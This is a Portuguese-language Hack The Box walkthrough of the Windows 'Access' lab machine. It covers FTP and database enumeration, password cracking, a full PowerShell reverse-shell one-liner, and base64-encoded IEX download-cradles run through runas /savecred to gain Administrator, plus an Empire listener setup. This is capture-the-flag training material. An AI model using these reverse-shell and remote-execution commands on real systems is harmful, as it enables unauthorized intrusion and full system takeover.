---
title: "Hack The Box - Access"
tags: [Windows,Easy,Web,Nishang,JAWS,Gobuster,Brute Force,Empire]
categories: HackTheBox
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/156>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 3 portas abertas

> Porta 21 -> Servidor FTP, não identificou a versão mas temos *login anonimo*, bom ponto para enumerarmos um pouco mais

> Porta 80 -> Servidor Web PRTG

> Porta 23 -> Servidor Telnet

## Enumeração da porta 80

Abrindo a página Web temos:

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_web.png)

### Gobuster

> gobuster dir -u http://10.10.10.98 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_gobuster.png)

Nada de interessante, por enquanto

## Enumeração porta 21

Enumeramos também o servidor ftp que está sendo disponibilizado pela porta 21, pelo login anonymous

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_ftp.png)

Verificamos duas pastas no FTP

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_ftp1.png)

Bom, baixamos todos os arquivos para melhor trabalhar

> wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_ftp2.png)

Com todos os arquivos baixados vamos ver o que podemos fazer

### Abrindo .mbd

Vimos que temos um arquivo mdb, esse é um arquivo de banco de dados, temos várias maneiras de destrinchar ele pra descobrir o que tem nele

#### Abrir online

Temos a opção de abrir ele online, através do site https://www.mdbopener.com/

Isso facilita muito o trabalho, mas por outro lado automatiza até demais, as vezes prejudicando se a pessoa não souber exatamente o que está sendo feito pela aplicação

Aqui abrimos ele no site

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_mdb.png)

Carregamos o arquivo no site

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_mdb1.png)

Verificando pelas tabelas, procurando algo interessante, encontramos uma tabela que nos chamou atenção

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_mdb2.png)

Verificamos do que ela se trata

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_mdg3.png)

Opa! Uma credencial

> access4u@security

Vamos mostrar aqui como encontrar essa senha na linha de comando

#### Abrir na linha de comando

O programa utilizado é o `mdb-sql`, iremos fazer a extração de todas as tables dele, é interessante saber como ele funciona. O resultado final é o mesmo

1. Aqui colocamos para listar todas as tables

> mdb.sql backup.mdb

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_mao.png)

2. Agora iremos realizar a exportação de todas as tables

Primeiro listamos todas as tabelas linha por linha

> for i in $(mdb-tables backup.mdb); do echo $i; done

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_mao1.png)

Segundo iremos realizar a exportação

> for i in $(mdb-tables backup.mdb); do mdb-export backup.mdb $i > $i;done

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_mao2.png)

Terceiro verificamos o tamanho delas, filtrando por ordem decrescente no caso, e vemos a `auth_users`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_mao3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_mao4.png)

Quarto, lemos a `auth_user`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_mao5.png)

### Quebrando senha do zip

Primeira coisa que notei é um arquivo .zip com senha, devemos realizar a quebra dessa senha pra ver o que tem dentro dele

Utilizei o próprio john para realizar essa quebra de senha

1. Gerar o hash da senha com o zip2john

> zip2john 'Access Control.zip' > access.hash

2. Gerar a wordlist (uma vez que a senha é access4u@security não vamos ter ela em nenhuma wordlist conhecida)

No caso eu gerei através do strings no mdb, assim, é meio que adivinhação isso, após várias tentativas frustadas tive esse insight e deu certo. Gerei com no mínimo 8 caracteres pq senão ia dar muito grande

*strings -n 8 backup.mdb | sort -u > lista.txt*

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_strings.png)

3. Com o john realizar a quebra da senha

Agora com a wordlist criada, iremos realizar a quebra da senha

> john access.hash --wordlist=/root/hackthebox/access/10.10.10.98/Backups/lista.txt

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_john.png)

4. Agora é so descompactar o arquivo

> 7z x 'Access Control.zip'

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_7z.png)

Vimos que ele dezipou um arquivo chamado: 'Access Control.pst'

### Lendo arquivo .pst

Agora devemos realizar a leitura desse arquivo .pst

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_pst.png)

Com o comando `readpst` fazemos isso, ele gerou um arquivo chamado: 'Access Control.mbox'

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_pst1.png)

### Lendo arquivo .mbox

Agora devemos realizar a leitura desse arquivo .mbox

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_mbox.png)

Com o `cat` fazemos a leitura do arquivo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_mbox1.png)

Descobrimos outra credencial

`security:4Cc3ssC0ntr0ller`

## Enumeração porta 23 (Telnet)

Bom, uma vez que já temos uma credencial com login e senha, começamos a testar ela em vários serviços, o primeiro que me veio a mente foi o telnet que está aberto na porta 23

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_telnet.png)

Agora vamos pegar um shell melhorado

# Exploração

### Usando Nishang

Utilizarei o `nishang`, ele possui diversos

> https://github.com/samratashok/nishang

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_nis.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_nis1.png)

Irei utilizar o Invoke-PowerShellTcpOneLine.ps1, mas qualquer um aqui daria certo (usei ele por simplicidade)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_nis2.png)

> powershell -command "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.119',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

#### Recebendo Reverse Shell

Abro o rlwrap nc, executo o comando e recebo a shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_rev.png)

# Escalação de privilégio

Iremos demonstrar diferentes tipos de escalação privilégio na máquina

## 1º Modo - JAWS

Por ser uma máquina fácil, temos vários modos de escalar privilégio nela, uma delas vamos rodar um script chamada `JAWS`

> https://github.com/411Hall/JAWS

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_jaws.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_jaws1.png)

Executamos ele na máquina

1. Fazemos o download dele

> wget https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_jaws2.png)

2. Levantamos um Python Web Server na máquina e na Máquina Access Executamos ele

> IEX(New-Object Net.WebClient).downloadString('http://10.10.16.119/jaws-enum.ps1') > enum.txt

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_jaws3.png)

3. Verificando os resultados

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_jaws5.png)

Opa, temos credenciais de Administrator salvas no sistema

### Usando runas

Iremos executar comandos como se administrador fosse

> runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.16.119/Invoke-PowerShellTcp.ps1')"

1. Preparar o Reverse TCP para ser usado

Irei utilizar novamente o nishang

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_nis1.png)

`Invoke-PowerShellTcp.ps1`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_tcp.png)

Devemos adicionar na ultima para ele executar assim que for baixado no servidor web

> Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.119 -Port 443

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_tpc1.png)

2. Executando

Agora devemos ligar nosso `rlwrap nc`, nosso `python web server` e realizar o download na máquina Access

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_runas.png)

Pronto, temos acesso de Administrador ao sistema

## 2º Modo - Através do arquivo .lnk na pasta Publico

Temos outros modos de escalar privilégio através do arquivo .ink que se encontra na pasta Desktop do usuário Público

A ideia é a mesma do runas, mas aqui vemos outra maneira de se explorar isso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_lnk1.png)

Dando um `type` nele verificamos que ele da runas

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_lnk.png)

Vamos reproduzir isso para ganhar um shell de root

```
$WScript = New-Object -ComObject Wscript.Shell
$shortcut = Get-ChildItem *.lnk
$WScript.CreateShortcut($shortcut)
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_lnk2.png)

Convertemos para base64 e `UTF-16LE`

*echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.119/Invoke-PowerShellTcp.ps1')" | iconv --to-code UTF-16LE | base64 -w 0*

> SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADEAMQA5AC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwAC4AcABzADEAJwApAA==

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_lnk3.png)

Agora executamos como `runas` (lembrar de arrumar o nishang, ligar o python web server e o rlwrap nc)

> runas /user:ACCESS\Administrator /savecred "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADEAMQA5AC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwAC4AcABzADEAJwApAA=="

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_lnk4.png)

### Pegamos flag de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_user.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_root.png)

# Utilizando Empire

Agora como algo a mais a ser feito nessa máquina, vamos realizar a exploração pelo Empire, que é um Módulo de Pós-Exploração muito bom, nos trás muitas possibilidades, é um servidor de comando e controle muito completo para exploração Windows

> https://github.com/BC-SECURITY/Empire

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_emp.png)

Primeiro passo após instalar ele é abrir o executável do empire na pasta dele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_emp1.png)

Agora é setar o listener que será utilizado

```
uselistener http
set Host http://10.10.16.119:5555
set BindIP 10.10.16.119
set Port 5555
execute
```

Setamos para porta 5555 no meu IP da minha Kali

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_emp2.png)

Agora fazemos o powershell que será executado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_emp3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_emp4.png)

Agora executamos na máquina ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_emp5.png)

Recebemos o stager no Empire

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_emp6.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_emp7.png)

Agora da pra ser feito uma infidade de coisas nele, como por exemplo os 220 módulos que podem ser executados

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_emp8.png)

Vamos rodar o PowerUps por exemplo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_emp9.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-access/A_emp10.png)

Bom, aqui já deu pra ter uma noção do que podemos fazer com essa ferramenta!

Até a próxima pessoal!